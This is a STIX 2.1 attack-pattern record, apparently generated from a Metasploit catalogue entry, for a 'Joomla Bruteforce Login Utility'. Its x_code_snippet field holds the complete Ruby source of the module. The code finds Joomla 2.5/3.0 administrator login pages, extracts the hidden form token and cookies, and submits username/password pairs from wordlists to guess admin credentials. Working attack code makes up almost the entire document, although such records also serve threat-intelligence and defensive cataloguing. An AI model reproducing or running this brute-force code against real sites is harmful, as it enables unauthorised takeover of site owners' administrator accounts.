{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23ec7e8d-9222-4f79-9a0b-00826fffa78f",
    "created": "2024-08-14T16:29:08.618878Z",
    "modified": "2024-08-14T16:29:08.618882Z",
    "name": "Joomla Bruteforce Login Utility",
    "description": "This module attempts to authenticate to Joomla 2.5. or 3.0 through bruteforce attacks",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/joomla_bruteforce_login.rb",
            "external_id": "joomla_bruteforce_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#WeakpasswordJoomla"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Joomla Bruteforce Login Utility',\n      'Description'    => 'This module attempts to authenticate to Joomla 2.5. or 3.0 through bruteforce attacks',\n      'Author'         => 'luisco100[at]gmail.com',\n      'References'     =>\n        [\n          ['CVE', '1999-0502'] # Weak password Joomla\n        ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptPath.new('USERPASS_FILE', [false, 'File containing users and passwords separated by space, one pair per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')]),\n        OptPath.new('USER_FILE', [false, 'File containing users, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', \"http_default_users.txt\")]),\n        OptPath.new('PASS_FILE', [false, 'File containing passwords, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')]),\n        OptString.new('AUTH_URI', [true, 'The URI to authenticate against', '/administrator/index.php']),\n        OptString.new('FORM_URI', [true, 'The FORM URI to authenticate against' , '/administrator']),\n        OptString.new('USER_VARIABLE', [true, 'The name of the variable for the user field', 'username']),\n        OptString.new('PASS_VARIABLE', [true, 'The name of the variable for the password field' , 'passwd']),\n        OptString.new('WORD_ERROR', [true, 'The word of message for detect that login fail', 'mod-login-username'])\n      ])\n\n    register_autofilter_ports([80, 443])\n  end\n\n  def find_auth_uri\n    if datastore['AUTH_URI'] && datastore['AUTH_URI'].length > 0\n      paths = [datastore['AUTH_URI']]\n    else\n      paths = %w(\n        /\n        /administrator/\n      )\n    end\n\n    paths.each do |path|\n      begin\n        res = send_request_cgi(\n          'uri'    => path,\n          'method' => 'GET'\n        )\n      rescue ::Rex::ConnectionError\n        next\n      end\n\n      next unless res\n\n      if res.redirect? && res.headers['Location'] && res.headers['Location'] !~ /^http/\n        path = res.headers['Location']\n        vprint_status(\"#{rhost}:#{rport} - Following redirect: #{path}\")\n        begin\n          res = send_request_cgi(\n            'uri'     => path,\n            'method'  => 'GET'\n          )\n        rescue ::Rex::ConnectionError\n          next\n        end\n        next unless res\n      end\n\n      return path\n    end\n\n    nil\n  end\n\n  def target_url\n    proto = 'http'\n    if rport == 443 || ssl\n      proto = 'https'\n    end\n    \"#{proto}://#{rhost}:#{rport}#{@uri}\"\n  end\n\n  def run_host(ip)\n    vprint_status(\"#{rhost}:#{rport} - Searching Joomla authentication URI...\")\n    @uri = find_auth_uri\n\n    unless @uri\n      vprint_error(\"#{rhost}:#{rport} - No URI found that asks for authentication\")\n      return\n    end\n\n    @uri = \"/#{@uri}\" if @uri[0, 1] != '/'\n\n    vprint_status(\"#{target_url} - Attempting to login...\")\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user, pass)\n    vprint_status(\"#{target_url} - Trying username:'#{user}' with password:'#{pass}'\")\n    response  = do_web_login(user, pass)\n    result = determine_result(response)\n\n    if result == :success\n      print_good(\"#{target_url} - Successful login '#{user}' : '#{pass}'\")\n      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: response.inspect)\n      return :abort if datastore['STOP_ON_SUCCESS']\n      return :next_user\n    else\n      vprint_error(\"#{target_url} - Failed to login as '#{user}'\")\n      return\n    end\n  end\n\n  def do_web_login(user, pass)\n    user_var = datastore['USER_VARIABLE']\n    pass_var = datastore['PASS_VARIABLE']\n\n    referer_var = \"http://#{rhost}/administrator/index.php\"\n\n    vprint_status(\"#{target_url} - Searching Joomla Login Response...\")\n    res = login_response\n\n    unless res && res.code = 200 && !res.get_cookies.blank?\n      vprint_error(\"#{target_url} - Failed to find Joomla Login Response\")\n      return nil\n    end\n\n    vprint_status(\"#{target_url} - Searching Joomla Login Form...\")\n    hidden_value = get_login_hidden(res)\n    if hidden_value.nil?\n      vprint_error(\"#{target_url} - Failed to find Joomla Login Form\")\n      return nil\n    end\n\n    vprint_status(\"#{target_url} - Searching Joomla Login Cookies...\")\n    cookie = get_login_cookie(res)\n    if cookie.blank?\n      vprint_error(\"#{target_url} - Failed to find Joomla Login Cookies\")\n      return nil\n    end\n\n    vprint_status(\"#{target_url} - Login with cookie ( #{cookie} ) and Hidden ( #{hidden_value}=1 )\")\n    res = send_request_login(\n      'user_var'     => user_var,\n      'pass_var'     => pass_var,\n      'cookie'       => cookie,\n      'referer_var'  => referer_var,\n      'user'         => user,\n      'pass'         => pass,\n      'hidden_value' => hidden_value\n    )\n\n    if res\n      vprint_status(\"#{target_url} - Login Response #{res.code}\")\n      if res.redirect? && res.headers['Location']\n        path = res.headers['Location']\n        vprint_status(\"#{target_url} - Following redirect to #{path}...\")\n\n        res = send_request_raw(\n          'uri'     => path,\n          'method'  => 'GET',\n          'cookie' => \"#{cookie}\"\n        )\n      end\n    end\n\n    return res\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{target_url} - Failed to connect to the web server\")\n      return nil\n  end\n\n  def send_request_login(opts = {})\n    res = send_request_cgi(\n      'uri'     => @uri,\n      'method'  => 'POST',\n      'cookie'  => \"#{opts['cookie']}\",\n      'headers' =>\n        {\n          'Referer' => opts['referer_var']\n        },\n      'vars_post' => {\n        opts['user_var']     => opts['user'],\n        opts['pass_var']     => opts['pass'],\n        'lang'               => '',\n        'option'             => 'com_login',\n        'task'               => 'login',\n        'return'             => 'aW5kZXgucGhw',\n        opts['hidden_value'] => 1\n      }\n    )\n\n    res\n  end\n\n  def determine_result(response)\n    return :abort unless response.kind_of?(Rex::Proto::Http::Response)\n    return :abort unless response.code\n\n    if [200, 301, 302].include?(response.code)\n      if response.to_s.include?(datastore['WORD_ERROR'])\n        return :fail\n      else\n        return :success\n      end\n    end\n\n    :fail\n  end\n\n  def login_response\n    uri = normalize_uri(datastore['FORM_URI'])\n    res = send_request_cgi!('uri' => uri, 'method' => 'GET')\n\n    res\n  end\n\n  def get_login_cookie(res)\n    return nil unless res.kind_of?(Rex::Proto::Http::Response)\n\n    res.get_cookies\n  end\n\n  def get_login_hidden(res)\n    return nil unless res.kind_of?(Rex::Proto::Http::Response)\n\n    return nil if res.body.blank?\n\n    vprint_status(\"#{target_url} - Testing Joomla 2.5 Form...\")\n    form = res.body.split(/<form action=([^\\>]+) method=\"post\" id=\"form-login\"\\>(.*)<\\/form>/mi)\n\n    if form.length == 1  # is not Joomla 2.5\n      vprint_status(\"#{target_url} - Testing Form Joomla 3.0 Form...\")\n      form = res.body.split(/<form action=([^\\>]+) method=\"post\" id=\"form-login\" class=\"form-inline\"\\>(.*)<\\/form>/mi)\n    end\n\n    if form.length == 1 # is not Joomla 3\n      vprint_error(\"#{target_url} - Last chance to find a login form...\")\n      form = res.body.split(/<form id=\"login-form\" action=([^\\>]+)\\>(.*)<\\/form>/mi)\n    end\n\n    begin\n      input_hidden = form[2].split(/<input type=\"hidden\"([^\\>]+)\\/>/mi)\n      input_id = input_hidden[7].split(\"\\\"\")\n    rescue NoMethodError\n      return nil\n    end\n\n    valor_input_id = input_id[1]\n\n    valor_input_id\n  end\nend\n"
}